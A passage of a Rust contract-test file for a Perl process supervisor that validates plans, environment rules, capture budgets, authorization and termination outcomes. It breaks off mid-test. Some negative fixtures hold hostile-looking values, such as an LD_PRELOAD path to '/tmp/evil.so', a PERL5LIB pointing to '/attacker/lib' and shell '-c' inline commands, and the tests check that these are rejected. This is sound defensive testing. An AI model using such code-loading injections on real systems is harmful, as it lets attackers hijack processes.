//! Contract proof for the supervised process domain.
//!
//! Each section below is a control: it fails when a specific wrong
//! implementation is written, not merely when the code stops compiling. The
//! wrong implementations under test are the ones that make a process layer
//! dishonest — a timeout that reads as success, a truncated capture that
//! reads as complete output, a dropped handle that reads as cleanup, a secret
//! that reaches a public identity, or fake evidence that reads as a real run.

use std::path::PathBuf;
use std::time::Duration;

use perl_subprocess_runtime::process::{
    AmbientInheritance, AuthorizationEvidence, AuthorizationStrength, BudgetChannel,
    CODE_LOADING_VARIABLES, CancellationAcknowledgement, CancellationPolicy, CancellationReason,
    CaptureBudget, ClaimBoundary, CleanupDisposition, ControlState, CwdPolicy, DeadlinePolicy,
    DecodedViewLimitation, EnvVarName, EnvironmentProjection, EventLedger, EvidenceClass,
    EvidenceFreshness, ExecutableIdentity, ExecutionProfile, FakeSupervisor, HandleDropDisposition,
    LEGACY_CONTAINMENT, Limitation, ObservedSettlement, OperationId, OutputLimitAction,
    OwnerDomain, PROCESS_DOMAIN_SCHEMA_VERSION, PlanId, PlanRejection, PlatformRequirement,
    PrivateBytes, PrivatePath, ProcessEventKind, ProcessPlan, ProcessSupervisor, PublicProjection,
    ResolutionProvenance, RetentionPolicy, SchemaVersion, ScriptedOutcome, ScriptedRun,
    SecretValue, StdinPolicy, StdinWriteOutcome, StreamChannel, StreamEvidence, SubjectIdentity,
    SubjectReference, TerminalDisposition, TerminationPolicy, TreeDisposition, TruncationState,
};

type TestResult = Result<(), Box<dyn std::error::Error>>;

// ───────────────────────────── fixture builders ─────────────────────────────

fn current_root() -> SubjectIdentity {
    SubjectIdentity {
        root: Some(SubjectReference::new("root:workspace-1", EvidenceFreshness::Current)),
        ..SubjectIdentity::default()
    }
}

fn resolved_perl() -> ExecutableIdentity {
    ExecutableIdentity::resolved(
        "perl",
        PrivatePath::new(PathBuf::from("/usr/bin/perl")),
        ResolutionProvenance::ConfiguredAbsolutePath,
    )
}

fn user_authorization() -> AuthorizationEvidence {
    AuthorizationEvidence::new(
        SchemaVersion::new(1),
        "authz:user-action:42",
        EvidenceFreshness::Current,
        AuthorizationStrength::ExplicitUserAction,
    )
}

fn allow_listed_environment() -> EnvironmentProjection {
    EnvironmentProjection::new("env-snapshot:1", AmbientInheritance::AllowListedOnly)
        .allow(EnvVarName::new("PATH"))
}

/// A valid one-shot Linux plan: the base every mutation below starts from.
fn valid_linux_one_shot() -> ProcessPlan {
    ProcessPlan::builder(
        PlanId::new("plan-run-file-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .argv(["-w", "script.pl"])
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace/project"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(30)))
    .termination(TerminationPolicy::ProcessTree {
        graceful: Duration::from_millis(500),
        then_forced: true,
    })
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build()
}

fn valid_interactive_session() -> ProcessPlan {
    ProcessPlan::builder(
        PlanId::new("plan-dap-1"),
        OperationId::new("dap-launch"),
        OwnerDomain::DebugAdapter,
        ExecutionProfile::InteractiveSession,
        resolved_perl(),
        allow_listed_environment(),
    )
    .argv(["-d", "script.pl"])
    .stdin(StdinPolicy::Streamed)
    .cancellation(CancellationPolicy::Cooperative { grace: Duration::from_millis(250) })
    .subject(current_root())
    .authorization(user_authorization())
    .build()
}

fn valid_hermetic_probe() -> ProcessPlan {
    ProcessPlan::builder(
        PlanId::new("plan-oracle-1"),
        OperationId::new("real-perl-oracle"),
        OwnerDomain::RealPerlOracle,
        ExecutionProfile::HermeticProbe,
        resolved_perl(),
        EnvironmentProjection::new("env-snapshot:hermetic", AmbientInheritance::DenyAll),
    )
    .argv(["-e", "print 1"])
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/tmp/hermetic"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(AuthorizationEvidence::new(
        SchemaVersion::new(1),
        "authz:hermetic",
        EvidenceFreshness::Current,
        AuthorizationStrength::HermeticNoAmbientInput,
    ))
    .build()
}

fn valid_release_smoke() -> ProcessPlan {
    ProcessPlan::builder(
        PlanId::new("plan-release-1"),
        OperationId::new("packaged-binary-smoke"),
        OwnerDomain::ReleaseSmoke,
        ExecutionProfile::ReleaseArtifactSmoke,
        ExecutableIdentity::resolved(
            "perl-lsp",
            PrivatePath::new(PathBuf::from("/dist/perl-lsp")),
            ResolutionProvenance::DeclaredWorkspaceRoot,
        ),
        allow_listed_environment(),
    )
    .argv(["--version"])
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(10)))
    .authorization(AuthorizationEvidence::new(
        SchemaVersion::new(1),
        "authz:ci",
        EvidenceFreshness::Current,
        AuthorizationStrength::TrustedWorkspacePolicy,
    ))
    .build()
}

fn rejection_of(plan: ProcessPlan) -> Result<PlanRejection, Box<dyn std::error::Error>> {
    match plan.validate() {
        Ok(_) => Err("expected the plan to be rejected, but it validated".into()),
        Err(rejection) => Ok(rejection),
    }
}

// ─────────────────────── profile fixtures validate ───────────────────────

#[test]
fn every_shipped_profile_fixture_validates() -> TestResult {
    for plan in [
        valid_linux_one_shot(),
        valid_interactive_session(),
        valid_hermetic_probe(),
        valid_release_smoke(),
    ] {
        let profile = plan.profile();
        if let Err(rejection) = plan.validate() {
            return Err(format!("{profile:?} fixture was rejected: {rejection}").into());
        }
    }
    Ok(())
}

#[test]
fn validation_binds_the_fingerprint_it_validated() -> TestResult {
    let plan = valid_linux_one_shot();
    let expected = plan.semantic_fingerprint();
    let validated = plan.validate()?;
    assert_eq!(validated.fingerprint(), expected);
    assert_eq!(validated.plan().semantic_fingerprint(), expected);
    Ok(())
}

// ─────────────────────────── validation controls ───────────────────────────

#[test]
fn an_unresolved_executable_is_unstartable() -> TestResult {
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        ExecutableIdentity::unresolved("perl"),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(rejection_of(plan)?, PlanRejection::UnresolvedExecutableIdentity);
    Ok(())
}

#[test]
fn an_ambient_executable_lookup_is_unstartable() -> TestResult {
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        ExecutableIdentity::resolved(
            "perl",
            PrivatePath::new(PathBuf::from("/usr/bin/perl")),
            ResolutionProvenance::AmbientLookup,
        ),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(rejection_of(plan)?, PlanRejection::AmbientExecutableResolution);
    Ok(())
}

#[test]
fn a_shell_with_an_inline_command_is_unstartable() -> TestResult {
    for (shell, path, flag) in [
        ("sh", "/bin/sh", "-c"),
        ("bash", "/bin/bash", "-c"),
        ("cmd.exe", "/c/Windows/System32/cmd.exe", "/C"),
        ("pwsh", "/usr/bin/pwsh", "-Command"),
    ] {
        let plan = ProcessPlan::builder(
            PlanId::new("plan-1"),
            OperationId::new("run-file"),
            OwnerDomain::RunFile,
            ExecutionProfile::LinuxOneShot,
            ExecutableIdentity::resolved(
                shell,
                PrivatePath::new(PathBuf::from(path)),
                ResolutionProvenance::ConfiguredAbsolutePath,
            ),
            allow_listed_environment(),
        )
        .argv([flag, "perl script.pl | tee out"])
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
        .subject(current_root())
        .authorization(user_authorization())
        .claim_boundary(ClaimBoundary::linux_only())
        .build();
        assert!(
            matches!(rejection_of(plan)?, PlanRejection::ShellInvocationRejected { .. }),
            "{shell} {flag} was not refused"
        );
    }
    Ok(())
}

#[test]
fn a_shell_without_an_inline_command_is_not_refused_as_a_shell() -> TestResult {
    // Negative control for the control above: the rule must key on the inline
    // command flag, not on the program's name, or it becomes a name blocklist
    // that refuses legitimate executions and misses `/bin/sh -c` by any other
    // spelling.
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        ExecutableIdentity::resolved(
            "sh",
            PrivatePath::new(PathBuf::from("/bin/sh")),
            ResolutionProvenance::ConfiguredAbsolutePath,
        ),
        allow_listed_environment(),
    )
    .argv(["script.sh"])
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert!(plan.validate().is_ok());
    Ok(())
}

#[test]
fn nul_bytes_in_the_invocation_are_unstartable() -> TestResult {
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .argv(["-e", "print\0 1"])
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(rejection_of(plan)?, PlanRejection::NulByteInInvocation);
    Ok(())
}

#[test]
fn an_exactness_profile_refuses_an_ambient_working_directory() -> TestResult {
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(rejection_of(plan)?, PlanRejection::AmbientCwdRejected);
    Ok(())
}

#[test]
fn a_relative_working_directory_is_unstartable() -> TestResult {
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("relative/dir"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(rejection_of(plan)?, PlanRejection::NonAbsoluteCwd);
    Ok(())
}

#[test]
fn contradictory_environment_rules_are_unstartable() -> TestResult {
    let environment = EnvironmentProjection::new("env:1", AmbientInheritance::AllowListedOnly)
        .allow(EnvVarName::new("PATH"))
        .deny(EnvVarName::new("PATH"));
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        environment,
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(
        rejection_of(plan)?,
        PlanRejection::ContradictoryEnvironmentRules { variable: "PATH".to_string() }
    );
    Ok(())
}

#[test]
fn an_unacknowledged_code_loading_variable_is_unstartable() -> TestResult {
    let environment = EnvironmentProjection::new("env:1", AmbientInheritance::AllowListedOnly)
        .add(EnvVarName::new("PERL5LIB"), SecretValue::new("/attacker/lib"));
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        environment,
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(
        rejection_of(plan)?,
        PlanRejection::UnacknowledgedCodeLoadingVariable { variable: "PERL5LIB".to_string() }
    );
    Ok(())
}

#[test]
fn an_acknowledged_code_loading_variable_is_startable_outside_a_hermetic_profile() -> TestResult {
    let environment = EnvironmentProjection::new("env:1", AmbientInheritance::AllowListedOnly)
        .add(EnvVarName::new("PERL5LIB"), SecretValue::new("/workspace/lib"))
        .acknowledging_code_loading();
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        environment,
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert!(plan.validate().is_ok());
    Ok(())
}

#[test]
fn a_hermetic_probe_refuses_ambient_inheritance_and_code_loading() -> TestResult {
    let inheriting = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("oracle"),
        OwnerDomain::RealPerlOracle,
        ExecutionProfile::HermeticProbe,
        resolved_perl(),
        EnvironmentProjection::new("env:1", AmbientInheritance::InheritExceptDenied),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/tmp/h"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .build();
    assert_eq!(rejection_of(inheriting)?, PlanRejection::HermeticProfileViolated);

    let injecting = ProcessPlan::builder(
        PlanId::new("plan-2"),
        OperationId::new("oracle"),
        OwnerDomain::RealPerlOracle,
        ExecutionProfile::HermeticProbe,
        resolved_perl(),
        EnvironmentProjection::new("env:2", AmbientInheritance::DenyAll)
            .add(EnvVarName::new("LD_PRELOAD"), SecretValue::new("/tmp/evil.so"))
            .acknowledging_code_loading(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/tmp/h"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .build();
    assert_eq!(rejection_of(injecting)?, PlanRejection::HermeticProfileViolated);
    Ok(())
}

#[test]
fn capture_budgets_must_be_bounded_consistent_and_nonzero() -> TestResult {
    let zero = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .stdout_budget(CaptureBudget::bounded(0))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(
        rejection_of(zero)?,
        PlanRejection::ZeroCaptureBudget { channel: BudgetChannel::Stdout }
    );

    let inconsistent = valid_linux_one_shot();
    let inconsistent = ProcessPlan::builder(
        inconsistent.plan_id().clone(),
        inconsistent.operation().clone(),
        inconsistent.owner(),
        inconsistent.profile(),
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .stderr_budget(CaptureBudget {
        observe_limit_bytes: 100,
        retain_limit_bytes: 200,
        on_limit: OutputLimitAction::TruncateAndContinue,
    })
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(
        rejection_of(inconsistent)?,
        PlanRejection::InconsistentCaptureBudget { channel: BudgetChannel::Stderr }
    );

    let overflowing = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .stdout_budget(CaptureBudget::bounded(u64::MAX))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(
        rejection_of(overflowing)?,
        PlanRejection::CaptureBudgetOverflow { channel: BudgetChannel::Stdout }
    );
    Ok(())
}

#[test]
fn lifecycle_policies_must_be_possible() -> TestResult {
    let no_deadline = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(rejection_of(no_deadline)?, PlanRejection::MissingDeadline);

    let zero_deadline = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::ZERO))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(rejection_of(zero_deadline)?, PlanRejection::ZeroDeadline);

    let uncancellable_session = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("dap"),
        OwnerDomain::DebugAdapter,
        ExecutionProfile::InteractiveSession,
        resolved_perl(),
        allow_listed_environment(),
    )
    .stdin(StdinPolicy::Streamed)
    .subject(current_root())
    .authorization(user_authorization())
    .build();
    assert_eq!(rejection_of(uncancellable_session)?, PlanRejection::MissingCancellationPolicy);

    let impossible_termination = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .termination(TerminationPolicy::ProcessTree { graceful: Duration::ZERO, then_forced: false })
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(rejection_of(impossible_termination)?, PlanRejection::ImpossibleTerminationPolicy);

    let streamed_one_shot = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .stdin(StdinPolicy::Streamed)
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(rejection_of(streamed_one_shot)?, PlanRejection::StreamedStdinRejected);
    Ok(())
}

#[test]
fn stale_subject_and_authorization_evidence_refuse_before_start() -> TestResult {
    for freshness in [EvidenceFreshness::Stale, EvidenceFreshness::Unknown] {
        let plan = ProcessPlan::builder(
            PlanId::new("plan-1"),
            OperationId::new("run-file"),
            OwnerDomain::RunFile,
            ExecutionProfile::LinuxOneShot,
            resolved_perl(),
            allow_listed_environment(),
        )
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
        .subject(SubjectIdentity {
            root: Some(SubjectReference::new("root:1", EvidenceFreshness::Current)),
            source: Some(SubjectReference::new("source:1", freshness)),
            ..SubjectIdentity::default()
        })
        .authorization(user_authorization())
        .claim_boundary(ClaimBoundary::linux_only())
        .build();
        assert!(
            matches!(rejection_of(plan)?, PlanRejection::StaleSubjectIdentity { .. }),
            "{freshness:?} source reference was admitted"
        );
    }

    let missing_root = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(rejection_of(missing_root)?, PlanRejection::MissingSubjectIdentity);
    Ok(())
}

#[test]
fn authorization_must_be_present_current_and_sufficient() -> TestResult {
    let base = |authorization: Option<AuthorizationEvidence>| {
        let builder = ProcessPlan::builder(
            PlanId::new("plan-1"),
            OperationId::new("run-file"),
            OwnerDomain::RunFile,
            ExecutionProfile::LinuxOneShot,
            resolved_perl(),
            allow_listed_environment(),
        )
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
        .subject(current_root())
        .claim_boundary(ClaimBoundary::linux_only());
        match authorization {
            Some(evidence) => builder.authorization(evidence).build(),
            None => builder.build(),
        }
    };

    assert_eq!(rejection_of(base(None))?, PlanRejection::MissingAuthorizationEvidence);
    assert_eq!(
        rejection_of(base(Some(AuthorizationEvidence::new(
            SchemaVersion::new(1),
            "authz:1",
            EvidenceFreshness::Stale,
            AuthorizationStrength::ExplicitUserAction,
        ))))?,
        PlanRejection::StaleAuthorizationEvidence
    );
    assert_eq!(
        rejection_of(base(Some(AuthorizationEvidence::new(
            SchemaVersion::new(1),
            "authz:1",
            EvidenceFreshness::Unknown,
            AuthorizationStrength::ExplicitUserAction,
        ))))?,
        PlanRejection::MissingAuthorizationEvidence
    );
    assert_eq!(
        rejection_of(base(Some(AuthorizationEvidence::new(
            SchemaVersion::new(1),
            "authz:1",
            EvidenceFreshness::Current,
            AuthorizationStrength::NotProven,
        ))))?,
        PlanRejection::InsufficientAuthorizationEvidence
    );
    Ok(())
}

#[test]
fn a_linux_profile_requires_a_linux_claim_boundary() -> TestResult {
    let plan = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary { platform: PlatformRequirement::AnyPlatform })
    .build();
    assert_eq!(rejection_of(plan)?, PlanRejection::UnsupportedPlatformRequirement);
    Ok(())
}

#[test]
fn a_public_projection_cannot_publish_privately_held_values() -> TestResult {
    let with_secret_env = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        EnvironmentProjection::new("env:1", AmbientInheritance::AllowListedOnly)
            .add(EnvVarName::new("API_TOKEN"), SecretValue::new("s3cret")),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .retention(RetentionPolicy {
        retain_stdout: true,
        retain_stderr: true,
        public_projection: PublicProjection::IncludeRetainedOutput,
    })
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(
        rejection_of(with_secret_env)?,
        PlanRejection::PublicRetentionWouldExposePrivateValues
    );

    let with_private_stdin = ProcessPlan::builder(
        PlanId::new("plan-2"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .stdin(StdinPolicy::Bytes(PrivateBytes::new(b"my $secret = 1;".to_vec())))
    .retention(RetentionPolicy {
        retain_stdout: true,
        retain_stderr: true,
        public_projection: PublicProjection::IncludeRetainedOutput,
    })
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(
        rejection_of(with_private_stdin)?,
        PlanRejection::PublicRetentionWouldExposePrivateValues
    );
    Ok(())
}

#[test]
fn a_plan_from_another_schema_version_fails_closed() -> TestResult {
    let future = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .schema_version(SchemaVersion::new(PROCESS_DOMAIN_SCHEMA_VERSION.get() + 1))
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert!(matches!(
        rejection_of(future)?,
        PlanRejection::UnsupportedSchemaVersion { declared, supported }
            if declared == PROCESS_DOMAIN_SCHEMA_VERSION.get() + 1
                && supported == PROCESS_DOMAIN_SCHEMA_VERSION.get()
    ));
    Ok(())
}

#[test]
fn a_correlation_identifier_cannot_change_a_policy_outcome() -> TestResult {
    // Plan and operation ids are correlation labels. If a caller could change
    // an outcome by renaming one, free-form strings would have become policy
    // authority.
    let make = |plan_id: &str, operation: &str| {
        ProcessPlan::builder(
            PlanId::new(plan_id),
            OperationId::new(operation),
            OwnerDomain::RunFile,
            ExecutionProfile::LinuxOneShot,
            resolved_perl(),
            allow_listed_environment(),
        )
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
        .subject(current_root())
        .claim_boundary(ClaimBoundary::linux_only())
        .build()
    };
    assert_eq!(
        rejection_of(make("plan-a", "trusted"))?,
        rejection_of(make("authorized-plan", "definitely-allowed"))?
    );

    let blank_operation = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("   "),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert_eq!(rejection_of(blank_operation)?, PlanRejection::MissingOperationIdentity);
    Ok(())
}

// ─────────────────────── terminal precedence controls ───────────────────────

#[test]
fn a_control_plane_termination_never_becomes_an_ordinary_success() -> TestResult {
    // The wrong implementation this kills: reading the child's wait status
    // after cleanup and reporting exit code 0 as success, discarding the fact
    // that the run was killed for a deadline, a cancellation, or an output
    // budget.
    let zero_exit = ObservedSettlement::Exited { code: 0 };

    let timed_out = ControlState { deadline_reached: true, ..ControlState::default() };
    assert_eq!(TerminalDisposition::elect(timed_out, zero_exit), TerminalDisposition::TimedOut);

    let limited = ControlState { output_limit_exceeded: true, ..ControlState::default() };
    assert_eq!(
        TerminalDisposition::elect(limited, zero_exit),
        TerminalDisposition::OutputLimitExceeded
    );

    let cancelled_running = ControlState {
        cancellation_requested: Some(CancellationReason::UserRequested),
        started_before_cancellation: true,
        ..ControlState::default()
    };
    assert_eq!(
        TerminalDisposition::elect(cancelled_running, zero_exit),
        TerminalDisposition::CancelledRunning(CancellationReason::UserRequested)
    );

    let cancelled_before_start = ControlState {
        cancellation_requested: Some(CancellationReason::Shutdown),
        started_before_cancellation: false,
        ..ControlState::default()
    };
    assert_eq!(
        TerminalDisposition::elect(cancelled_before_start, ObservedSettlement::NotStarted),
        TerminalDisposition::CancelledBeforeStart(CancellationReason::Shutdown)
    );

    let cleanup_failed = ControlState { cleanup_failed: true, ..ControlState::default() };
    assert_eq!(
        TerminalDisposition::elect(cleanup_failed, zero_exit),
        TerminalDisposition::CleanupFailed
    );

    let supervisor_failed = ControlState { supervisor_failed: true, ..ControlState::default() };
    assert_eq!(
        TerminalDisposition::elect(supervisor_failed, zero_exit),
        TerminalDisposition::SupervisorFailed
    );

    for control in [timed_out, limited, cancelled_running, cleanup_failed, supervisor_failed] {
        assert!(!TerminalDisposition::elect(control, zero_exit).is_ordinary_success());
    }
    Ok(())
}

#[test]
fn precedence_is_total_and_ordered() -> TestResult {
    let everything = ControlState {
        cancellation_requested: Some(CancellationReason::Shutdown),
        started_before_cancellation: true,
        deadline_reached: true,
        output_limit_exceeded: true,
        cleanup_failed: true,
        supervisor_failed: true,
    };
